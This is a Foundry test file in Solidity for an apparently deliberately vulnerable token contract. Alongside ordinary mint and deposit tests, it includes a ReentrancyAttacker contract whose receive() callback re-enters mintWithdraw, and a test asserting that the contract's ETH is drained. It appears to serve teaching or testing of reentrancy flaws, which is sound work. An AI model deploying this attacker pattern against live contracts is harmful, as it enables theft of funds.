// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableMintToken.sol";

contract VulnerableMintTokenTest is Test {
    VulnerableMintToken public token;
    address public owner;
    address public user1;
    address public user2;

    function setUp() public {
        owner = address(this);
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");

        // Deploy token
        token = new VulnerableMintToken();

        // Fund contract with ETH
        vm.deal(address(token), 10 ether);

        // Fund users
        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
    }

    function testInitialState() public {
        assertEq(token.name(), "Vulnerable Mint Token");
        assertEq(token.symbol(), "VMT");
        assertEq(token.owner(), owner);
        assertEq(address(token).balance, 10 ether);
    }

    function testDepositETH() public {
        vm.prank(user1);
        token.depositETH{value: 0.5 ether}();
        assertEq(address(token).balance, 10.5 ether);
    }

    function testMintWithdrawNormalCase() public {
        uint256 initialBalance = address(token).balance;
        
        vm.prank(user1);
        token.mintWithdraw(2);
        
        assertEq(token.balanceOf(user1), 2);
        assertEq(address(user1).balance, 1 ether + initialBalance);
        assertEq(address(token).balance, 0);
    }

    function testMintWithdrawInvalidAmount() public {
        vm.prank(user1);
        vm.expectRevert("Invalid mint amount");
        token.mintWithdraw(0);

        vm.prank(user1);
        vm.expectRevert("Invalid mint amount");
        token.mintWithdraw(4);
    }

    function testReentrancyExploit() public {
        // Deploy attacker contract
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(token));
        
        // Fund attacker
        vm.deal(address(attacker), 1 ether);
        
        uint256 initialTokenBalance = address(token).balance;
        
        console.log("Initial contract balance:", initialTokenBalance);
        console.log("Initial attacker token balance:", token.balanceOf(address(attacker)));
        
        // Execute attack
        attacker.attack();
        
        uint256 finalTokenBalance = address(token).balance;
        uint256 attackerTokens = token.balanceOf(address(attacker));
        
        console.log("Final contract balance:", finalTokenBalance);
        console.log("Final attacker token balance:", attackerTokens);
        console.log("Attacker ETH balance:", address(attacker).balance);
        
        // Verify the attack was successful
        assertEq(finalTokenBalance, 0, "Contract should be drained");
        assertGt(attackerTokens, 3, "Attacker should have more than 3 tokens (the max per call)");
        assertGt(address(attacker).balance, 1 ether, "Attacker should have gained ETH");
    }

    function testMultipleUsersCanMint() public {
        vm.prank(user1);
        token.mintWithdraw(1);
        
        // Fund contract again
        vm.deal(address(token), 5 ether);
        
        vm.prank(user2);
        token.mintWithdraw(3);
        
        assertEq(token.balanceOf(user1), 1);
        assertEq(token.balanceOf(user2), 3);
    }
}

/**
 * @title ReentrancyAttacker
 * @dev Contract that exploits the reentrancy vulnerability in VulnerableMintToken
 */
contract ReentrancyAttacker {
    VulnerableMintToken public token;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 5;

    constructor(address _token) {
        token = VulnerableMintToken(_token);
    }

    /**
     * @dev Initiates the reentrancy attack
     */
    function attack() external {
        attackCount = 0;
        token.mintWithdraw(1);
    }

    /**
     * @dev Fallback function that re-enters mintWithdraw
     * This gets called when the vulnerable contract sends ETH
     */
    receive() external payable {
        // Continue attacking if we haven't reached max attempts and contract has balance
        if (attackCount < MAX_ATTACKS && address(token).balance > 0) {
            attackCount++;
            token.mintWithdraw(1);
        }
    }

    /**
     * @dev Get ETH balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
